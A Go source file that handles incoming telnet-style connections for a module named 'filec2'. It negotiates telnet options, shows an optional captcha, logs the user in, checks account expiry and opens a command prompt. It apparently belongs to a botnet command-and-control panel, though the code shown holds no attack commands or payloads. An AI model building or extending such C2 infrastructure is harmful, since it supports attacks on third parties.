package handlers

import (
	"fmt"
	"log"
	"net"
	"time"

	"filec2/Handlers/sessions"
	"filec2/Handlers/terminal"
	"filec2/Handlers/views"
	"filec2/config"
)

func handle(conn net.Conn) {
	defer conn.Close()

	term := terminal.New(conn)

	session := &sessions.Session{
		Terminal: term,
		Conn:     conn,
		Created:  time.Now(),
	}

	buf := make([]byte, 64)
	_, err := conn.Read(buf)
	if err != nil {
		return
	}

	conn.Write([]byte{
		255, 251, 1,
		255, 251, 3,
		255, 252, 34,
	})

	if err := session.Clear(); err != nil {
		return
	}

	if config.CapchaEnabled == true {
		if err := views.CapchaPage(session); err != nil {
			fmt.Println("handlers/capcha:", err)
			return
		}
	}

	if err := views.LoginPage(session); err != nil {
		fmt.Println("handlers/handle:", err)
		return
	}

	if err := sessions.New(session); err != nil {
		log.Println("handlers/handle.NewSession:", err)
		return
	}

	defer session.Remove()
	go session.Worker()

	if err := session.Clear(); err != nil {
		return
	}
	if session.User.Expiry < time.Now().Unix() {
		return
	}
	if err := views.PromptPage(session); err != nil && err != net.ErrWriteToConnected {
		fmt.Println("handlers/handle:", err)
		return
	}
}
